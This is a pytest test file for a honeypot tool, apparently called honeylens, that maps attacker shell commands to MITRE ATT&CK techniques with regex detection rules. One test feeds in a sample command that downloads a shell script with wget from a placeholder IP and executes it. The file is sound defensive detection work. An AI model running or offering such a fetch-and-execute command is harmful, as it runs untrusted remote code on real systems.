import json
import re
import time

import pytest

from honeylens.mitre.attack import (
    REQUIRED_TACTICS,
    RuleError,
    coverage,
    default_rules,
    load_snapshot,
    match_command,
    navigator_layer,
    parse_rules,
)

RULES = default_rules()


def test_minimum_rules_and_tactics():
    assert len(RULES) >= 40
    tactics = {r.tactic for r in RULES}
    assert len(tactics) >= 8
    assert tactics >= REQUIRED_TACTICS


def test_every_rule_has_required_fields_and_examples():
    for r in RULES:
        assert re.fullmatch(r"HL-[A-Z0-9]+-\d{3}", r.id)
        assert r.technique and r.confidence in {"high", "medium", "low"} and len(r.rationale) > 20
        assert r.positive and r.negative, f"{r.id} needs positive and negative examples"


@pytest.mark.parametrize("rule", RULES, ids=lambda r: r.id)
def test_positive_examples_match(rule):
    for cmd in rule.positive:
        assert rule.regex.search(cmd), f"{rule.id} should match {cmd!r}"


@pytest.mark.parametrize("rule", RULES, ids=lambda r: r.id)
def test_negative_examples_do_not_match(rule):
    for cmd in rule.negative:
        assert not rule.regex.search(cmd), f"{rule.id} should NOT match {cmd!r}"


def test_techniques_valid_in_snapshot():
    snap = load_snapshot()
    for r in RULES:
        t = snap["techniques"][r.technique]
        assert not t["revoked"] and not t["deprecated"]


def _one_rule(technique, tactic="discovery"):
    return f"""rules:
  - id: HL-T-001
    regex: 'x'
    technique: {technique}
    tactic: {tactic}
    confidence: high
    rationale: test rule rationale text
"""


def test_unknown_technique_rejected():
    with pytest.raises(RuleError, match="unknown technique"):
        parse_rules(_one_rule("T9999"))


def test_revoked_technique_rejected():
    # T1562.001 was revoked in ATT&CK v19 (replaced by T1685).
    with pytest.raises(RuleError, match="REVOKED"):
        parse_rules(_one_rule("T1562.001", "stealth"))


def test_deprecated_technique_rejected():
    snap = load_snapshot()
    dep = next(t for t, v in snap["techniques"].items() if v["deprecated"] and not v["revoked"])
    tactic = snap["techniques"][dep]["tactics"][0] if snap["techniques"][dep]["tactics"] else "discovery"
    with pytest.raises(RuleError, match="DEPRECATED"):
        parse_rules(_one_rule(dep, tactic))


def test_wrong_tactic_and_bad_regex_and_duplicates_rejected():
    with pytest.raises(RuleError, match="not a tactic"):
        parse_rules(_one_rule("T1082", "impact"))
    with pytest.raises(RuleError, match="bad regex"):
        parse_rules(_one_rule("T1082").replace("'x'", "'(unclosed'"))
    dup = _one_rule("T1082") + _one_rule("T1082").split("rules:\n", 1)[1]
    with pytest.raises(RuleError, match="duplicate"):
        parse_rules(dup)


def test_redos_safety_on_hostile_input():
    hostile = [("a" * 4096), ("/" * 4096), (" -" * 2048), ("wget " + "x" * 4000), ("ssh " + "-D" * 2000)]
    for text in hostile:
        start = time.perf_counter()
        match_command(text)
        assert time.perf_counter() - start < 0.5


def test_realistic_session_mapping():
    found = {m.technique for m in match_command("cd /tmp; wget http://198.51.100.9/x.sh; chmod +x x.sh; ./x.sh")}
    assert {"T1105", "T1059.004"} <= found
    assert match_command("echo hello world") == []  # unmapped


def test_coverage_and_navigator():
    cov = coverage()
    assert cov["rules"] == len(RULES) and 0 < cov["coverage_percent"] <= 100
    layer = navigator_layer()
    assert layer["domain"] == "enterprise-attack" and layer["techniques"]
    json.dumps(layer)
